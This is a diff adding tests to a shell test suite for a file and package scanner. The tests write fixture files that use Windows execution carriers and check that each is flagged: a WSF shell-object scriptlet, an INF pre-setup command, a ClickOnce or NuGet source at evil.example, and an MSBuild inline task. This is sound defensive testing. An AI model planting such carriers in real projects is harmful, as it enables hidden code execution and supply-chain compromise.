@@ -7931,6 +7931,55 @@ printf 'plugins { id "java" }\nrepositories { mavenCentral() }\ntask b { doLast 
     || check "file: plain gradle no exec-fetch reason" "0" "0"
 rm -rf "$TDIR2"
 
+# ─── F41–F43 + nuget: script-host/installer/clickonce carriers ─────────
+XDIR=$(mktemp -d)
+printf '<package><job><script language="VBScript">Set s=CreateObject("WScript.Shell"):s.Run "calc"</script></job></package>\n' \
+    > "$XDIR/p.wsf"
+./hlse_core file "$XDIR/p.wsf" 2>&1 | grep -q "WSF SCRIPTLET" \
+    && check "file: wsf shell-object scriptlet flagged" "0" "0" \
+    || check "file: wsf shell-object scriptlet flagged" "0" "1"
+printf 'plain text\n' > "$XDIR/note.wsf"
+./hlse_core file "$XDIR/note.wsf" 2>&1 | grep -q "WSF SCRIPTLET" \
+    && check "file: non-scriptlet .wsf no F41" "0" "1" \
+    || check "file: non-scriptlet .wsf no F41" "0" "0"
+printf '[version]\nsignature="$CHICAGO$"\n[DefaultInstall.NT]\nRunPreSetupCommands=sec.evil\n' \
+    > "$XDIR/evil.inf"
+./hlse_core file "$XDIR/evil.inf" 2>&1 | grep -q "INF INSTALL" \
+    && check "file: inf DefaultInstall exec flagged" "0" "0" \
+    || check "file: inf DefaultInstall exec flagged" "0" "1"
+printf '[version]\nsignature="$CHICAGO$"\n' > "$XDIR/plain.inf"
+./hlse_core file "$XDIR/plain.inf" 2>&1 | grep -q "INF INSTALL" \
+    && check "file: signature-only .inf no F42" "0" "1" \
+    || check "file: signature-only .inf no F42" "0" "0"
+printf '<?xml version="1.0"?>\n<assembly><deployment codebase="http://evil.example/x.application"/></assembly>\n' \
+    > "$XDIR/x.application"
+./hlse_core file "$XDIR/x.application" 2>&1 | grep -q "CLICKONCE" \
+    && check "file: clickonce remote codebase flagged" "0" "0" \
+    || check "file: clickonce remote codebase flagged" "0" "1"
+printf '<?xml version="1.0"?>\n<assembly><deployment codebase="app.exe"/></assembly>\n' \
+    > "$XDIR/ok.application"
+./hlse_core file "$XDIR/ok.application" 2>&1 | grep -q "CLICKONCE" \
+    && check "file: local clickonce no F43" "0" "1" \
+    || check "file: local clickonce no F43" "0" "0"
+printf '<?xml version="1.0"?>\n<Project><UsingTask TaskName="X" TaskFactory="CodeTaskFactory"><Code>E()</Code></UsingTask></Project>\n' \
+    > "$XDIR/t.vcxproj"
+./hlse_core file "$XDIR/t.vcxproj" 2>&1 | grep -q "MSBUILD" \
+    && check "file: vcxproj inline task flagged" "0" "0" \
+    || check "file: vcxproj inline task flagged" "0" "1"
+mkdir -p "$XDIR/ng"
+printf '<?xml version="1.0"?>\n<configuration><packageSources><add key="x" value="https://evil.example/nuget"/></packageSources></configuration>\n' \
+    > "$XDIR/ng/nuget.config"
+./hlse_core package --manifest "$XDIR/ng/nuget.config" 2>&1 | grep -q "nuget package source" \
+    && check "manifest: nuget off-feed source flagged" "0" "0" \
+    || check "manifest: nuget off-feed source flagged" "0" "1"
+mkdir -p "$XDIR/ng2"
+printf '<?xml version="1.0"?>\n<configuration><packageSources><add key="nuget.org" value="https://api.nuget.org/v3/index.json"/></packageSources></configuration>\n' \
+    > "$XDIR/ng2/nuget.config"
+./hlse_core package --manifest "$XDIR/ng2/nuget.config" 2>&1 | grep -q "OK" \
+    && check "manifest: official nuget source clean" "0" "0" \
+    || check "manifest: official nuget source clean" "0" "1"
+rm -rf "$XDIR"
+
 # ─── results ────────────────────────────────────────────────────────────
 
 echo ""
